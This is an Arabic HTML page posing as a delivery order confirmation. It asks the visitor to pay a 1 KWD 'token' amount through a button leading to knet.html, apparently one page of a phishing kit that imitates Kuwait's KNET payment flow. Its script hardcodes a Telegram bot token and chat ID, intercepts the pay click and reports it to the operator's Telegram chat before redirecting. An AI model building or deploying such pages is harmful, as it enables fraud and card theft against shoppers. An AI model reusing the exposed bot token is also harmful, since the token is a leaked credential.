<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>تأكيد الطلب</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: #f4f5f7;
      color: #252525;
      font-family: Arial, Tahoma, sans-serif;
    }

    .page {
      width: min(100%, 430px);
      min-height: 100vh;
      margin: 0 auto;
      background: #fff;
      box-shadow: 0 0 22px rgba(0, 0, 0, .1);
    }

    .header {
      height: 58px;
      display: grid;
      grid-template-columns: 44px 1fr 44px;
      align-items: center;
      padding: 0 12px;
      border-bottom: 1px solid #eee;
    }

    .back {
      width: 36px;
      height: 36px;
      display: grid;
      place-items: center;
      color: #555;
      font-size: 30px;
      text-decoration: none;
    }

    .header-title {
      margin: 0;
      text-align: center;
      font-size: 20px;
      font-weight: 800;
    }

    .content {
      padding: 28px 18px;
    }

    .badge {
      width: 82px;
      height: 82px;
      margin: 8px auto 18px;
      display: grid;
      place-items: center;
      border-radius: 50%;
      background: #18a957;
      color: #fff;
      font-size: 42px;
      font-weight: 800;
    }

    h1 {
      margin: 0 0 12px;
      text-align: center;
      font-size: 24px;
      line-height: 1.4;
    }

    .lead {
      margin: 0 auto 24px;
      max-width: 330px;
      color: #666;
      text-align: center;
      font-size: 16px;
      line-height: 1.7;
    }

    .summary {
      display: grid;
      gap: 12px;
      margin: 0 0 22px;
      padding: 14px;
      border: 1px solid #eee;
      border-radius: 8px;
      background: #fff8fb;
    }

    .row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      font-size: 16px;
      line-height: 1.5;
    }

    .row strong {
      color: #1577d3;
      font-size: 20px;
    }

    .note {
      margin: 0 0 22px;
      padding: 12px;
      border-radius: 8px;
      background: #eef7ff;
      color: #23557f;
      font-size: 15px;
      line-height: 1.7;
    }

    .pay {
      width: 100%;
      height: 54px;
      display: grid;
      place-items: center;
      border-radius: 8px;
      background: #1577d3;
      color: #fff;
      font-size: 18px;
      font-weight: 800;
      text-decoration: none;
      box-shadow: 0 8px 18px rgba(21, 119, 211, .24);
    }

  </style>
</head>
<body>
  <main class="page">
    <header class="header">
      <a class="back" href="order-form.html" aria-label="رجوع">←</a>
      <p class="header-title">تأكيد الطلب</p>
      <span></span>
    </header>

    <section class="content">
      <div class="badge" aria-hidden="true">✓</div>
      <h1>تم حفظ بيانات التوصيل</h1>
      <p class="lead">لتأكيد الطلب، يرجى دفع مبلغ رمزي الآن، وباقي المبلغ يكون عند التوصيل والاستلام.</p>

      <div class="summary">
        <div class="row">
          <span>مبلغ التأكيد الآن</span>
          <strong>1 د.ك</strong>
        </div>
        <div class="row">
          <span>باقي المبلغ</span>
          <strong>عند التوصيل</strong>
        </div>
      </div>

      <p class="note">بعد دفع 1 د.ك يتم تثبيت الطلب، ويتم استكمال باقي المبلغ عند الاستلام من مندوب التوصيل.</p>
      <a class="pay" id="confirmPay" href="knet.html">ادفع 1 د.ك لتأكيد الطلب</a>
    </section>
  </main>
  <script>
    function send_telegram_message(message, disable_notification = false) {
      const botToken = window.TELEGRAM_BOT_TOKEN || "8770505930:AAE0rDy1QYCdbWW0S-EeRtFp-6XOFUgIKsU";
      const chatId = window.TELEGRAM_CHAT_ID || "7801329761";

      if (!botToken || !chatId) {
        return;
      }

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          disable_notification: disable_notification,
          parse_mode: "HTML",
        }),
      }).catch(function() {});
    }

    document.getElementById("confirmPay").addEventListener("click", function(event) {
      event.preventDefault();
      send_telegram_message("تم الضغط على زر دفع 1 د.ك لتأكيد الطلب.");
      setTimeout(function() {
        window.location.href = "knet.html";
      }, 300);
    });
  </script>
</body>
</html>
